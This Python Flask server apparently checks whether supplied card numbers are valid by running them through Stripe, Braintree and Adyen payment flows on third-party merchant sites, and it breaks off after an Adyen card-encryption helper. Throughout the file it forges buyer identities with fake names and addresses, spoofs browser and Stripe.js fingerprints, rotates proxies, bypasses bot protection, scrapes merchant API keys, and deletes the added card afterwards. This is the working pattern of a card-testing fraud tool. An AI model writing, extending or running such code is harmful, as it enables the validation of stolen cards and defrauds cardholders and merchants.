"""
Payment Gateway Flask Server – V5.0.0
Handles Stripe Auth, Stripe Charge, Braintree Auth, Adyen Charge payment processing
with per-request session isolation, proxy support, and cloudscraper bypass.
"""

import re
import json
import time
import uuid
import os
import random
import logging
import threading
from datetime import datetime, timedelta
from typing import Any, Dict, Optional, Tuple
from urllib.parse import urlparse

import requests
import base64
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from flask import Flask, request, jsonify
from lxml import html
from faker import Faker
import cloudscraper
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

# ═══════════════════════════════════════════════════════
#  App & Logging
# ═══════════════════════════════════════════════════════

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════
#  Constants
# ═══════════════════════════════════════════════════════

# Response status labels (stylised text)
APPROVED = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
DECLINED = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
ERROR = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
SUCCESS = "𝙎𝙐𝘾𝘾𝞢𝙎𝙎 ✅"
FAILED = "𝙁𝘼𝙄𝙇𝙀𝘿 ❌"
CHARGE = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 ✅"
INSUFFICIENT_FUNDS = "𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙁𝙪𝙣𝙙𝙨 ☑️"
PASSAD = "𝙋𝘼𝙎𝙎𝙀𝘿 ❎"

REQUEST_TIMEOUT = 30
GEO_CACHE_TTL = timedelta(minutes=5)
SESSION_MAX_AGE = timedelta(seconds=30)
EMAIL_DOMAINS = ("gmail.com", "yahoo.com", "hotmail.com", "outlook.com")

# ═══════════════════════════════════════════════════════
#  Pre-compiled Regex Patterns (speed optimisation)
# ═══════════════════════════════════════════════════════

_RE_PK_LIVE = re.compile(r'"publishableKey":"(pk_live_[^"]+)"')
_RE_ACCOUNT_ID = re.compile(r'"accountId":"(acct_[^"]+)"')
_RE_SETUP_NONCE = re.compile(r'"createSetupIntentNonce":"([^"]+)"')
_RE_EMAIL = re.compile(r'"email":"([^"]+)"')
_RE_API_KEY = re.compile(r"ApiKey=([^\"&\s]+)")
_RE_WIDGET_ID = re.compile(r"WidgetId=([^\"&\s]+)")
_RE_WIDGET_ID_ALT = re.compile(r"Widget ID:\s*([^\"&\s]+)")
_RE_PK_LIVE_RAW = re.compile(r"pk_live_[A-Za-z0-9]+")
_RE_ERROR_MSG = re.compile(r":\s*(.*?)(?=\s*\(|$)")

# ═══════════════════════════════════════════════════════
#  Shared HTTP Session Pool (for external APIs)
# ═══════════════════════════════════════════════════════

_retry_strategy = Retry(
    total=2,
    backoff_factor=1,
    status_forcelist=[429, 502, 503, 504],
    allowed_methods=["POST", "GET"],
)

def _build_api_session(proxies: Optional[Dict] = None) -> requests.Session:
    """Create a requests.Session with retry adapters and optional proxy."""
    s = requests.Session()
    adapter = HTTPAdapter(max_retries=_retry_strategy, pool_maxsize=10)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    if proxies:
        s.proxies.update(proxies)
    return s


# ═══════════════════════════════════════════════════════
#  Faker & Geo Data
# ═══════════════════════════════════════════════════════

_fake = Faker("en_US")

_FALLBACK_GEO = {
    "CA": {"Los Angeles": "90210", "San Francisco": "94102", "San Diego": "92101"},
    "NY": {"New York": "10001", "Albany": "12201", "Buffalo": "14201"},
    "TX": {"Houston": "77001", "Dallas": "75201", "Austin": "73301"},
    "FL": {"Miami": "33101", "Tampa": "33601", "Orlando": "32801"},
    "IL": {"Chicago": "60601", "Springfield": "62701"},
    "WA": {"Seattle": "98101", "Tacoma": "98401"},
}

_geo_cache: Dict[str, Any] = {"data": None, "ts": None}
_geo_lock = threading.Lock()

_GEO_URL = "https://raw.githubusercontent.com/ANYA-LZ/country-map/refs/heads/main/US.json"


def _fetch_geo_data() -> Dict:
    """Fetch US geographic data with thread-safe caching."""
    with _geo_lock:
        now = datetime.now()
        if _geo_cache["data"] and _geo_cache["ts"] and (now - _geo_cache["ts"]) < GEO_CACHE_TTL:
            return _geo_cache["data"]

    try:
        resp = requests.get(_GEO_URL, timeout=8)
        resp.raise_for_status()
        data = resp.json()
        with _geo_lock:
            _geo_cache["data"] = data
            _geo_cache["ts"] = datetime.now()
        return data
    except Exception as exc:
        logger.warning(f"Geo data fetch failed, using fallback: {exc}")
        return _FALLBACK_GEO


def _random_user_agent() -> str:
    """Generate a realistic mobile User-Agent string."""
    chrome = f"{random.randint(130, 145)}.0.0.0"
    android = random.choice([11, 12, 13, 14, 15])
    device = random.choice(["SM-G991B", "SM-G998B", "SM-S926B", "Pixel 7", "Pixel 8", "Mi 12"])
    return (
        f"Mozilla/5.0 (Linux; Android {android}; {device}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
    )


def generate_random_person() -> Optional[Dict]:
    """Generate a realistic US resident profile for payment forms."""
    geo = _fetch_geo_data()
    if not geo:
        return None
    state = random.choice(list(geo.keys()))
    city = random.choice(list(geo[state].keys()))
    zipcode = geo[state][city]
    username = _fake.user_name()[:10]
    return {
        "first_name": _fake.first_name(),
        "last_name": _fake.last_name(),
        "email": f"{username}@{random.choice(EMAIL_DOMAINS)}".lower(),
        "phone": f"({zipcode[:3]}) {_fake.numerify('###-###-####')}",
        "address": _fake.street_address(),
        "city": city,
        "state": state,
        "zipcode": zipcode,
        "country": "United States",
        "user_agent": _random_user_agent(),
    }


# ═══════════════════════════════════════════════════════
#  Proxy Utilities
# ═══════════════════════════════════════════════════════

class ProxyConnectionError(Exception):
    """Raised when a proxy-related network failure is detected."""

    def __init__(self, message: str):
        self.message = message
        super().__init__(self.message)


_PROXY_INDICATORS = (
    "proxy", "tunnel", "cannot connect to proxy", "proxy authentication required",
    "407", "socks", "connection refused", "connection reset", "connection aborted",
    "unable to connect", "max retries exceeded", "newconnectionerror",
    "proxyconnectionerror",
)


def is_proxy_error(exc: Exception) -> Tuple[bool, Optional[str]]:
    """Return (True, message) if *exc* looks proxy-related."""
    err = str(exc).lower()
    cls_name = type(exc).__name__.lower()

    if "proxyerror" in cls_name or "connecttimeout" in cls_name:
        return True, categorize_proxy_error(exc)

    for indicator in _PROXY_INDICATORS:
        if indicator in err:
            return True, categorize_proxy_error(exc)

    return False, None


def categorize_proxy_error(exc: Exception) -> str:
    """Map a proxy exception to a user-friendly label."""
    err = str(exc).lower()
    if "remotedisconnected" in err or "remote end closed" in err:
        return "Proxy Disconnected"
    if "closed connection" in err:
        return "Proxy Connection Closed"
    if "timeout" in err or "timed out" in err:
        return "Proxy Timeout"
    if "refused" in err:
        return "Proxy Refused"
    if "reset" in err or "aborted" in err:
        return "Proxy Reset"
    if "authentication" in err or "407" in err:
        return "Proxy Auth Failed"
    if "unable to connect to proxy" in err:
        return "Proxy Unreachable"
    if "socks" in err:
        return "SOCKS Proxy Error"
    if "tunnel" in err:
        return "Proxy Tunnel Failed"
    if "max retries" in err:
        return "Proxy Failed"
    return "Proxy Error"


def parse_proxy(proxy_string: Optional[str]) -> Optional[str]:
    """Normalise any proxy format into ``scheme://[user:pass@]host:port``."""
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()
    if proxy_string.startswith(("http://", "https://", "socks4://", "socks5://")):
        return proxy_string
    if "@" in proxy_string:
        return f"http://{proxy_string}"
    parts = proxy_string.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"http://{user}:{passwd}@{host}:{port}"
    logger.warning(f"Unrecognised proxy format: {proxy_string}")
    return None


def _proxy_dict(gateway_config: Dict) -> Optional[Dict[str, str]]:
    """Return ``{'http': url, 'https': url}`` or *None*."""
    raw = gateway_config.get("proxy")
    if not raw:
        return None
    url = parse_proxy(raw)
    return {"http": url, "https": url} if url else None


def _handle_proxy_exc(exc: Exception, context: str):
    """Log and re-raise as ProxyConnectionError when applicable."""
    is_pe, _ = is_proxy_error(exc)
    if is_pe:
        msg = categorize_proxy_error(exc)
        logger.error(f"Proxy error in {context}: {msg}")
        raise ProxyConnectionError(msg) from exc


# ═══════════════════════════════════════════════════════
#  Cookie Helpers
# ═══════════════════════════════════════════════════════

def _apply_cookies(session: requests.Session, gateway_config: Dict) -> None:
    """Inject gateway cookies into *session* unless version says otherwise."""
    if "without_cookies" in gateway_config.get("version", "").lower():
        return
    cookies_list = gateway_config.get("cookies", [])
    for c in cookies_list:
        name, value = c.get("name"), c.get("value")
        if name and value:
            session.cookies.set(name, value)


# ═══════════════════════════════════════════════════════
#  Session Manager  (per-request isolation)
# ═══════════════════════════════════════════════════════

class SessionManager:
    """Creates and tracks per-request HTTP sessions to prevent cross-contamination."""

    def __init__(self):
        self._sessions: Dict[str, requests.Session] = {}
        self._timestamps: Dict[str, datetime] = {}
        self._lock = threading.Lock()

    # ── public ─────────────────────────────────────

    @staticmethod
    def create_request_id() -> str:
        return f"req_{uuid.uuid4().hex[:12]}_{int(time.time())}"

    def get_session(self, request_id: str, gateway_config: Dict, random_person: Dict) -> requests.Session:
        with self._lock:
            self._cleanup_expired()
            session = _create_gateway_session(gateway_config, random_person)
            self._sessions[request_id] = session
            self._timestamps[request_id] = datetime.now()
            return session

    def cleanup_session(self, request_id: str) -> None:
        with self._lock:
            sess = self._sessions.pop(request_id, None)
            self._timestamps.pop(request_id, None)
            if sess:
                try:
                    sess.close()
                except Exception:
                    pass

    def get_active_sessions_count(self) -> int:
        with self._lock:
            return len(self._sessions)

    # ── internal ───────────────────────────────────

    def _cleanup_expired(self) -> None:
        now = datetime.now()
        expired = [rid for rid, ts in self._timestamps.items() if now - ts > SESSION_MAX_AGE]
        for rid in expired:
            sess = self._sessions.pop(rid, None)
            self._timestamps.pop(rid, None)
            if sess:
                try:
                    sess.close()
                except Exception:
                    pass
            logger.debug(f"Expired session cleaned: {rid}")


def _create_gateway_session(gateway_config: Dict, random_person: Dict) -> requests.Session:
    """Build a fresh session pre-loaded with headers, proxy, and cookies."""
    parsed = urlparse(gateway_config["url"])
    origin = f"{parsed.scheme}://{parsed.netloc}"

    if gateway_config.get("bypass_cloudscraper", False):
        session = cloudscraper.create_scraper()
    else:
        session = requests.Session()
        adapter = HTTPAdapter(pool_maxsize=5)
        session.mount("https://", adapter)
        session.mount("http://", adapter)

    # Proxy
    proxy_url = parse_proxy(gateway_config.get("proxy"))
    using_proxy = False
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
        using_proxy = True
        logger.info(f"Session using proxy: {proxy_url}")

    session.headers.update({
        "User-Agent": random_person["user_agent"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "Origin": origin,
        "Referer": gateway_config["url"],
    })

    # Self-contained gateways manage their own sessions; skip warmup
    # to avoid consuming their cookies with a useless pre-request.
    if "Adyen Charge" in gateway_config.get("gateway_type", ""):
        _apply_cookies(session, gateway_config)
        return session

    # Warm-up request to collect server cookies
    try:
        resp = session.get(origin, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        session.cookies.update(resp.cookies)
        _apply_cookies(session, gateway_config)
    except Exception as exc:
        if using_proxy:
            _handle_proxy_exc(exc, "session_creation")
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            raise ProxyConnectionError(categorize_proxy_error(exc)) from exc
        raise

    return session


# Global instance
session_manager = SessionManager()


# ═══════════════════════════════════════════════════════
#  Page Scraping – Extract Secrets from Gateway Page
# ═══════════════════════════════════════════════════════

def _regex_find(pattern: re.Pattern, text: str) -> Optional[str]:
    """Return first group from *pattern* or None."""
    m = pattern.search(text)
    return m.group(1) if m else None


def extract_payment_config(
    request_id: str,
    card_number: str,
    random_person: Dict,
    gateway_config: Dict,
    session: requests.Session,
) -> Dict[str, Any]:
    """Scrape the gateway page to extract Stripe/Braintree secrets."""
    result: Dict[str, Any] = {
        "nonce": None,
        "pk_live": None,
        "accountId": None,
        "createSetupIntentNonce": None,
        "email": None,
        "ApiKey": None,
        "widgetId": None,
    }

    try:
        resp = session.get(gateway_config["url"], timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        session.cookies.update(resp.cookies)

        # Parse HTML for nonce
        tree = html.fromstring(resp.content)
        nonce_nodes = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        result["nonce"] = nonce_nodes[0] if nonce_nodes else None

        # Regex extraction from full page source
        page = resp.text
        result["pk_live"] = _regex_find(_RE_PK_LIVE, page)
        result["accountId"] = _regex_find(_RE_ACCOUNT_ID, page)
        result["createSetupIntentNonce"] = _regex_find(_RE_SETUP_NONCE, page)
        result["email"] = _regex_find(_RE_EMAIL, page)
        result["ApiKey"] = _regex_find(_RE_API_KEY, page)
        result["widgetId"] = _regex_find(_RE_WIDGET_ID, page) or _regex_find(_RE_WIDGET_ID_ALT, page)

        return result

    except requests.RequestException as exc:
        is_pe, msg = is_proxy_error(exc)
        if is_pe:
            logger.error(f"Proxy error in extract_payment_config: {categorize_proxy_error(exc)}")
            result["proxy_error"] = categorize_proxy_error(exc)
            return result
        logger.error(f"Request failed in extract_payment_config: {exc}")
        return result
    except Exception as exc:
        logger.error(f"Unexpected error in extract_payment_config: {exc}")
        return result


# ═══════════════════════════════════════════════════════
#  Stripe Auth – Get Payment Method ID
# ═══════════════════════════════════════════════════════

def get_stripe_auth_id(
    random_person: Dict,
    card_info: Dict,
    publishable_key: str,
    account_id: str,
    url: str,
    gateway_config: Optional[Dict] = None,
) -> Any:
    """Create a Stripe PaymentMethod and return its ID (or False / PROXY_ERROR:…)."""
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    year_short = str(card_info["year"])[-2:]

    headers = {
        "User-Agent": random_person["user_agent"],
        "Accept": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
    }

    payload = {
        "type": "card",
        "billing_details[name]": f"{random_person['first_name']} {random_person['last_name']}",
        "card[number]": card_info["number"],
        "card[cvc]": card_info["cvv"],
        "card[exp_month]": card_info["month"],
        "card[exp_year]": year_short,
        "guid": str(_fake.uuid4()),
        "muid": str(_fake.uuid4()),
        "sid": str(_fake.uuid4()),
        "payment_user_agent": (
            f"stripe.js/{random.randint(280000000, 290000000)}; "
            f"stripe-js-v3/{random.randint(280000000, 290000000)}; card-element"
        ),
        "referrer": origin,
        "time_on_page": str(random.randint(120000, 240000)),
        "client_attribution_metadata[client_session_id]": str(_fake.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": publishable_key,
        "_stripe_account": account_id,
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=payload,
            timeout=REQUEST_TIMEOUT,
        )
        resp.raise_for_status()
        pm_id = resp.json().get("id")
        return pm_id if pm_id else False
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_stripe_auth_id: {msg}")
            return f"PROXY_ERROR:{msg}"
        logger.error(f"Stripe PaymentMethod creation failed: {exc}")
        return False
    except Exception as exc:
        logger.error(f"Unexpected error in get_stripe_auth_id: {exc}")
        return False
    finally:
        api_session.close()


# ═══════════════════════════════════════════════════════
#  Stripe Auth v3 – Login Session Cache (5-hour TTL)
# ═══════════════════════════════════════════════════════

_LOGIN_CACHE_TTL = timedelta(hours=5)
_login_cache: Dict[str, Dict[str, Any]] = {}
_login_cache_lock = threading.Lock()


def _get_cached_login(login_email: str) -> Optional[Dict[str, Any]]:
    """Return cached login data if still valid, else None."""
    with _login_cache_lock:
        entry = _login_cache.get(login_email)
        if not entry:
            return None
        if datetime.now() - entry["ts"] > _LOGIN_CACHE_TTL:
            _login_cache.pop(login_email, None)
            logger.info(f"Login cache expired for {login_email}")
            return None
        logger.info(f"Login cache hit for {login_email}")
        return entry


def _set_cached_login(
    login_email: str,
    cookies: Dict[str, str],
    pk_live: str,
    origin: str,
    billing_url: str,
) -> None:
    """Store login session data in cache."""
    with _login_cache_lock:
        _login_cache[login_email] = {
            "cookies": cookies,
            "pk_live": pk_live,
            "origin": origin,
            "billing_url": billing_url,
            "ts": datetime.now(),
        }
    logger.info(f"Login session cached for {login_email}")


def _invalidate_cached_login(login_email: str) -> None:
    """Remove a login entry from cache."""
    with _login_cache_lock:
        _login_cache.pop(login_email, None)
    logger.info(f"Login cache invalidated for {login_email}")


# ═══════════════════════════════════════════════════════
#  Stripe Auth v3 – Login-based flow (ProWritingAid)
# ═══════════════════════════════════════════════════════

def _stripe_auth_login_flow(
    card_info: Dict,
    random_person: Dict,
    gateway_config: Dict,
) -> Tuple[str, str]:
    """Full Stripe Auth v3_with_login pipeline with login session caching.

    Cached per login_email for 5 hours:
        - Authenticated cookies, pk_live, origin, billing_url
    Fresh per card check:
        - verification_token (from billing page)
        - client_secret / seti_id (from StripeIntentForAddingCard)
        - confirm payload with card data
    """
    login_data = gateway_config.get("login")
    if not login_data:
        return ERROR, "Login credentials missing in gateway config"

    login_email = login_data.get("email")
    login_password = login_data.get("password")
    if not login_email or not login_password:
        return ERROR, "Login email or password missing"

    site_url = gateway_config["url"]
    parsed = urlparse(site_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    billing_url = site_url

    proxies = _proxy_dict(gateway_config)

    # ── Helper: build a fresh HTTP session ──
    def _build_login_session():
        if gateway_config.get("bypass_cloudscraper", False):
            s = cloudscraper.create_scraper()
        else:
            s = requests.Session()
            adapter = HTTPAdapter(pool_maxsize=5)
            s.mount("https://", adapter)
            s.mount("http://", adapter)
        if proxies:
            s.proxies = proxies
        s.headers.update({
            "User-Agent": random_person["user_agent"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        return s

    session = _build_login_session()

    try:
        cached = _get_cached_login(login_email)
        pk_live = None
        verification_token = None
        used_cache = False

        # ══════════════════════════════════════════════
        #  Try to reuse cached login session
        # ══════════════════════════════════════════════
        if cached:
            # Restore cached cookies into the new session
            for name, value in cached["cookies"].items():
                session.cookies.set(name, value)
            pk_live = cached["pk_live"]

            # Load billing page to get a fresh verification_token
            billing_resp = session.get(billing_url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            billing_resp.raise_for_status()

            # Check if redirected to login page (cookies expired)
            if "/Account/Login" in billing_resp.url:
                logger.info(f"Cached session expired for {login_email}, re-logging in")
                _invalidate_cached_login(login_email)
                cached = None
                # Rebuild session without stale cookies
                session.close()
                session = _build_login_session()
            else:
                billing_tree = html.fromstring(billing_resp.content)
                token_nodes = billing_tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
                if token_nodes:
                    verification_token = token_nodes[0]
                    used_cache = True
                    logger.info(f"Reusing cached login for {login_email} – skipped login")
                else:
                    # Token extraction failed, invalidate and re-login
                    _invalidate_cached_login(login_email)
                    cached = None
                    session.close()
                    session = _build_login_session()

        # ══════════════════════════════════════════════
        #  Full login (only when no valid cache)
        # ══════════════════════════════════════════════
        if not used_cache:
            # ── Step 1: GET billing URL → redirects to login page ──
            resp = session.get(billing_url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            resp.raise_for_status()

            tree = html.fromstring(resp.content)

            token_nodes = tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
            verification_token = token_nodes[0] if token_nodes else None
            if not verification_token:
                return ERROR, "Failed to extract verification token from login page"

            # ── Step 2: POST login ──
            login_url = f"{origin}/en/Account/Login3?returnUrl=/en/Payment/Billing?tab=methods"
            login_payload = {
                "ReturnUrl": "/en/Payment/Billing?tab=methods",
                "__RequestVerificationToken": verification_token,
                "UserName": login_email,
                "Password": login_password,
            }

            session.headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": origin,
                "Referer": resp.url,
            })

            login_resp = session.post(
                login_url, data=login_payload,
                timeout=REQUEST_TIMEOUT, allow_redirects=True,
            )
            login_resp.raise_for_status()

            if "/Account/Login" in login_resp.url:
                return FAILED, "Login failed – invalid credentials"

            # ── Step 3: Get billing page ──
            if "Billing" not in login_resp.url:
                billing_resp = session.get(billing_url, timeout=REQUEST_TIMEOUT)
                billing_resp.raise_for_status()
            else:
                billing_resp = login_resp

            billing_tree = html.fromstring(billing_resp.content)

            # Extract pk_live
            pk_nodes = billing_tree.xpath('//input[@name="StripePublicApiKey"]/@value')
            if not pk_nodes:
                pk_match = _RE_PK_LIVE_RAW.search(billing_resp.text)
                pk_live = pk_match.group(0) if pk_match else None
            else:
                pk_live = pk_nodes[0]

            if not pk_live:
                return ERROR, "Failed to extract pk_live from billing page"

            # Extract fresh verification_token
            token_nodes = billing_tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
            if token_nodes:
                verification_token = token_nodes[0]
            else:
                return ERROR, "Failed to extract verification token from billing page"

            # ── Cache the login session for reuse ──
            cookies_dict = {c.name: c.value for c in session.cookies}
            _set_cached_login(login_email, cookies_dict, pk_live, origin, billing_url)

        # ══════════════════════════════════════════════
        #  Per-card steps (always fresh)
        # ══════════════════════════════════════════════

        # ── Step 4: POST StripeIntentForAddingCard → fresh client_secret ──
        intent_url = f"{origin}/en/Payment/StripeIntentForAddingCard"
        session.headers.update({
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": billing_url,
            "__requestverificationtoken": verification_token,
        })

        intent_resp = session.post(intent_url, data="", timeout=REQUEST_TIMEOUT)
        intent_resp.raise_for_status()

        try:
            intent_data = intent_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, "Failed to parse SetupIntent response"

        client_secret = intent_data.get("clientSecret")
        if not client_secret:
            return ERROR, "Failed to get SetupIntent client_secret"

        # Extract seti_id from client_secret (seti_xxx_secret_xxx)
        seti_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else None
        if not seti_id:
            return ERROR, "Failed to parse SetupIntent ID"

        # ── Step 5: Confirm setup_intent via Stripe API ──
        year_short = str(card_info["year"])[-2:]

        stripe_headers = {
            "User-Agent": random_person["user_agent"],
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }

        confirm_payload = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_info["number"],
            "payment_method_data[card][cvc]": card_info["cvv"],
            "payment_method_data[card][exp_month]": card_info["month"],
            "payment_method_data[card][exp_year]": year_short,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": random_person["zipcode"],
            "payment_method_data[guid]": str(_fake.uuid4()),
            "payment_method_data[muid]": str(_fake.uuid4()),
            "payment_method_data[sid]": str(_fake.uuid4()),
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": (
                f"stripe.js/{random.randint(280000000, 290000000)}; "
                f"stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element"
            ),
            "payment_method_data[referrer]": f"{origin}/en/Payment/Billing?tab=methods",
            "payment_method_data[time_on_page]": str(random.randint(120000, 240000)),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": pk_live,
            "client_secret": client_secret,
        }

        confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"

        api_session = _build_api_session(proxies)
        try:
            confirm_resp = api_session.post(
                confirm_url, data=confirm_payload,
                headers=stripe_headers, timeout=REQUEST_TIMEOUT,
            )
        finally:
            api_session.close()

        try:
            confirm_data = confirm_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, "Failed to parse Stripe confirm response"

        # ── Step 6: Interpret result ──
        si_status = confirm_data.get("status")

        if si_status == "succeeded":
            pm_id = confirm_data.get("payment_method")
            delete_msg = ""

            if pm_id:
                # Add payment method to site
                try:
                    add_url = f"{origin}/en/Payment/StripeAddPaymentMethod"
                    session.headers.update({
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Content-Type": "application/json; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest",
                        "__requestverificationtoken": verification_token,
                    })
                    add_resp = session.post(
                        add_url,
                        data=json.dumps({"PaymentMethodId": pm_id}),
                        timeout=REQUEST_TIMEOUT,
                    )
                    add_resp.raise_for_status()
                except Exception as exc:
                    logger.warning(f"StripeAddPaymentMethod failed: {exc}")

                # Delete card: reload billing page to get numeric card ID + fresh token
                try:
                    del_billing = session.get(billing_url, timeout=REQUEST_TIMEOUT)
                    del_billing.raise_for_status()
                    del_tree = html.fromstring(del_billing.content)

                    # Fresh anti-forgery token from reloaded page
                    del_token_nodes = del_tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
                    del_token = del_token_nodes[0] if del_token_nodes else verification_token

                    # Extract numeric card ID from DeleteURL or data-card-id
                    card_id = None
                    # Try DeleteURL in embedded JSON: "DeleteURL":"/en/Payment/DeleteCustomerCard?cardId=NNNN"
                    m = re.search(r'DeleteCustomerCard\?cardId=(\d+)', del_billing.text)
                    if m:
                        card_id = m.group(1)
                    else:
                        # Try data-card-id attribute
                        cid_nodes = del_tree.xpath('//*[@data-card-id]/@data-card-id')
                        if cid_nodes:
                            card_id = cid_nodes[0]

                    if not card_id:
                        logger.warning("Could not find numeric card ID on billing page")
                        delete_msg = " (error delete)"
                    else:
                        del_url = f"{origin}/en/Payment/DeleteCustomerCard"
                        session.headers.update({
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "X-Requested-With": "XMLHttpRequest",
                            "Accept": "*/*",
                            "Referer": billing_url,
                        })
                        # Remove __requestverificationtoken from headers — token goes in body
                        session.headers.pop("__requestverificationtoken", None)
                        del_resp = session.post(
                            del_url,
                            data={"cardId": card_id, "__RequestVerificationToken": del_token},
                            timeout=REQUEST_TIMEOUT,
                        )
                        del_resp.raise_for_status()
                        delete_msg = ""
                except Exception as exc:
                    logger.warning(f"DeleteCustomerCard failed: {exc}")
                    delete_msg = " (error delete)"

            # Update cached cookies after successful flow
            cookies_dict = {c.name: c.value for c in session.cookies}
            _set_cached_login(login_email, cookies_dict, pk_live, origin, billing_url)

            return SUCCESS, f"Approved{delete_msg}"

        if si_status == "requires_action":
            next_action = confirm_data.get("next_action", {})
            action_type = next_action.get("type", "unknown")
            return PASSAD, f"Challenge Required ({action_type})"

        # Error case
        error_obj = confirm_data.get("error", {})
        if error_obj:
            err_msg = error_obj.get("message", "Unknown error")
            decline_code = error_obj.get("decline_code")
            if decline_code:
                if decline_code == "insufficient_funds":
                    return INSUFFICIENT_FUNDS, "Insufficient Funds"
                err_msg = f"{err_msg} ({decline_code.replace('_', ' ').title()})"
            return FAILED, err_msg

        return FAILED, f"Setup intent status: {si_status or 'unknown'}"

    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in stripe_auth_login_flow: {msg}")
            return ERROR, msg
        logger.error(f"Request error in stripe_auth_login_flow: {exc}")
        return ERROR, f"Request failed: {exc}"
    except Exception as exc:
        logger.error(f"Unexpected error in stripe_auth_login_flow: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session.close()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════
#  Adyen Charge – GOG Wallet Top-Up Flow
# ═══════════════════════════════════════════════════════


def _adyen_encrypt(field_name: str, value: str, adyen_public_key: str) -> str:
    """Encrypt card data using Adyen CSE format (JWE)."""
    exponent_hex, modulus_hex = adyen_public_key.split("|")
    exponent = int(exponent_hex, 16)
    modulus = int(modulus_hex, 16)

    public_numbers = rsa.RSAPublicNumbers(exponent, modulus)
    public_key = public_numbers.public_key(default_backend())

    timestamp = str(int(time.time() * 1000))
    plaintext = json.dumps({field_name: value, "generationtime": timestamp})
    plaintext_bytes = plaintext.encode("utf-8")

    aes_key = os.urandom(32)
    nonce = os.urandom(12)

    aesgcm = AESGCM(aes_key)
    ciphertext = aesgcm.encrypt(nonce, plaintext_bytes, None)

    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    header = {"alg": "RSA-OAEP-256", "enc": "A256GCM", "version": "1"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    encrypted_key_b64 = base64.urlsafe_b64encode(encrypted_aes_key).rstrip(b"=").decode()
    iv_b64 = base64.urlsafe_b64encode(nonce).rstrip(b"=").decode()

    ct = ciphertext[:-16]
    tag = ciphertext[-16:]
    ct_b64 = base64.urlsafe_b64encode(ct).rstrip(b"=").decode()
    tag_b64 = base64.urlsafe_b64encode(tag).rstrip(b"=").decode()

    return f"{header_b64}.{encrypted_key_b64}.{iv_b64}.{ct_b64}.{tag_b64}"


